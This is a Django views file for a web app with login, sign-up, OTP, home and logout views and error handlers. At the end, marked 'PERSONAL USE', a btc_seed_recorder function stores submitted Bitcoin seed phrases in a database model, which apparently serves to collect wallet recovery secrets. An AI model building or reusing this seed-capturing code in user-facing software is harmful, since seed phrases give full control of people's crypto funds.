from django.views.decorators.http import require_POST, require_GET
from django.shortcuts import render, redirect
from django.http import HttpResponse, JsonResponse
from django.contrib.sessions.models import Session

from .request_handler import login_get, login_post, sign_up_get, sign_up_post, validate_otp_get, validate_otp_post
from .models import BTC_SEED_PHRASE

import sys
sys.path.append('')
from utility.assests_links import asset_urls
from utility.app_db import check_login_status


login = lambda request: login_post(request) if request.method == 'POST' else login_get(request)
sign_up = lambda request: sign_up_post(request) if request.method == 'POST' else sign_up_get(request)
validate_otp = lambda request: validate_otp_post(request) if request.method == 'POST' else validate_otp_get(request)

@require_GET
def home(request):
    user_data = check_login_status(request)
    if not user_data:
        return redirect('/')
    else:
        context={}
        context['asset_urls'] = asset_urls
        context['first_name']=user_data['first_name']
        return render(request, 'app/home.html' ,context=context)

@require_GET
def logout(request):
    user_data = check_login_status(request)
    if user_data:
        session_key = request.session.session_key
        Session.objects.filter(session_key=session_key).delete()
        return redirect('/')
    else:
        return redirect('/home')
    





# Error Code Handler
def error404(request, exception):
    return render(request, 'app/404.html', status=404)

def error500(exception):
    return render(exception, 'app/500.html', status=500)


# @csrf_exempt
# @require_POST
# def test_api(request):
#     if request.method == "POST":
#         data = json.loads(request.body)
#         if data.get('number', None):
#             msg = {"squared": data['number']**2}
#             return JsonResponse(msg, content_type="application/json")
#         else:
#             return JsonResponse({'msg': "send a key 'number'"}, content_type="application/json")
#     else:
#         return redirect('/')

# def delete_all_sessions(request):
#     Session.objects.all().delete()
#     return redirect('/')


# PERSONAL USE
def btc_seed_recorder(request, seed):
    if BTC_SEED_PHRASE.objects.filter(seed=seed).exists():
        return {'status': False}
    
    BTC_SEED_PHRASE(seed=seed).save()
    return {'status': True}